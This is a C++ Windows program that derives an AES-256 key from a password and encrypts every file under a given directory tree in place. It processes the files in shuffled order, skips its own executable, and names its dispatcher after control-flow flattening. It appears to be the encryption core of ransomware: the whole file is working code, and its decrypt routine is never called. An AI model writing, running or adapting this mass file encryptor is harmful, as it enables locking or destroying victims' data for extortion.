#include <windows.h>
#include <wincrypt.h>
#include <iostream>
#include <vector>
#include <string>
#include <fstream>
#include <filesystem>
#include <random>
#include <functional>

#pragma comment(lib, "crypt32.lib")

const DWORD AES_BLOCK_SIZE = 16; // AES block size in bytes

void aesEncryptBuffer(std::vector<char>& buffer, const std::string& password) {
    HCRYPTPROV hProv = NULL;
    HCRYPTHASH hHash = NULL;
    HCRYPTKEY hKey = NULL;
    DWORD bufferSize = static_cast<DWORD>(buffer.size());
    DWORD encryptedSize = bufferSize + AES_BLOCK_SIZE; // Allocate extra space for padding

    // Initialize crypto provider
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        std::cerr << "CryptAcquireContext failed: " << GetLastError() << std::endl;
        return;
    }

    // Derive a hash from the password
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        std::cerr << "CryptCreateHash failed: " << GetLastError() << std::endl;
        CryptReleaseContext(hProv, 0);
        return;
    }
    if (!CryptHashData(hHash, reinterpret_cast<const BYTE*>(password.data()), static_cast<DWORD>(password.size()), 0)) {
        std::cerr << "CryptHashData failed: " << GetLastError() << std::endl;
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return;
    }

    // Generate an AES key from the hash
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        std::cerr << "CryptDeriveKey failed: " << GetLastError() << std::endl;
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return;
    }

    // Prepare buffer for encryption
    buffer.resize(encryptedSize);

    // Encrypt the buffer
    if (!CryptEncrypt(hKey, 0, TRUE, 0, reinterpret_cast<BYTE*>(buffer.data()), &bufferSize, encryptedSize)) {
        std::cerr << "CryptEncrypt failed: " << GetLastError() << std::endl;
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return;
    }

    // Resize buffer to the actual encrypted size
    buffer.resize(bufferSize);

    // Cleanup
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
}

void aesDecryptBuffer(std::vector<char>& buffer, const std::string& password) {
    HCRYPTPROV hProv = NULL;
    HCRYPTHASH hHash = NULL;
    HCRYPTKEY hKey = NULL;

    // Initialize crypto provider
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        std::cerr << "CryptAcquireContext failed: " << GetLastError() << std::endl;
        return;
    }

    // Derive a hash from the password
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        std::cerr << "CryptCreateHash failed: " << GetLastError() << std::endl;
        CryptReleaseContext(hProv, 0);
        return;
    }
    if (!CryptHashData(hHash, reinterpret_cast<const BYTE*>(password.data()), static_cast<DWORD>(password.size()), 0)) {
        std::cerr << "CryptHashData failed: " << GetLastError() << std::endl;
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return;
    }

    // Generate an AES key from the hash
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        std::cerr << "CryptDeriveKey failed: " << GetLastError() << std::endl;
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return;
    }

    // Decrypt the buffer
    DWORD bufferSize = static_cast<DWORD>(buffer.size());
    if (!CryptDecrypt(hKey, 0, TRUE, 0, reinterpret_cast<BYTE*>(buffer.data()), &bufferSize)) {
        std::cerr << "CryptDecrypt failed: " << GetLastError() << std::endl;
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return;
    }

    // Resize buffer to the actual decrypted size
    buffer.resize(bufferSize);

    // Cleanup
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
}

void processFile(const std::filesystem::path& filePath, const std::string& password) {
    std::fstream file(filePath, std::ios::in | std::ios::out | std::ios::binary);
    if (!file.is_open()) {
        std::cerr << "Failed to open file: " << filePath << std::endl;
        return;
    }

    // Read file content into buffer
    std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());

    // Encrypt the content
    aesEncryptBuffer(buffer, password);

    // Overwrite the file with encrypted content
    file.clear();
    file.seekp(0, std::ios::beg);
    file.write(buffer.data(), buffer.size());

    // Ensure file is truncated if encrypted content is smaller
    file.close();
    std::ofstream truncateFile(filePath, std::ios::binary | std::ios::out | std::ios::trunc);
    truncateFile.write(buffer.data(), buffer.size());

    std::cout << "Processed file: " << filePath << std::endl;
}

void controlFlowFlattenedDispatcher(const std::string& dirPath, const std::string& password, const std::filesystem::path& currentExePath) {
    namespace fs = std::filesystem;

    std::vector<std::function<void()>> tasks;

    try {
        if (!fs::exists(dirPath) || !fs::is_directory(dirPath)) {
            std::cerr << "Invalid directory path: " << dirPath << std::endl;
            return;
        }

        for (const auto& entry : fs::recursive_directory_iterator(dirPath)) {
            if (fs::is_regular_file(entry.path())) {
                if (entry.path() == currentExePath) {
                    std::cout << "Skipping the currently running executable: " << entry.path() << std::endl;
                    continue;
                }

                tasks.push_back([entry, password]() {
                    processFile(entry.path(), password);
                    });
            }
        }

        std::random_device rd;
        std::mt19937 g(rd());
        std::shuffle(tasks.begin(), tasks.end(), g);

        for (auto& task : tasks) {
            task();
        }
    }
    catch (const fs::filesystem_error& e) {
        std::cerr << "Filesystem error: " << e.what() << std::endl;
    }
    catch (const std::exception& e) {
        std::cerr << "Standard exception: " << e.what() << std::endl;
    }
    catch (...) {
        std::cerr << "Unknown error occurred during control flow dispatch." << std::endl;
    }
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <directory_path> <password>" << std::endl;
        return 1;
    }

    std::string directoryPath = argv[1];
    std::string password = argv[2];
    std::filesystem::path currentExePath = argv[0];

    controlFlowFlattenedDispatcher(directoryPath, password, currentExePath);

    return 0;
}
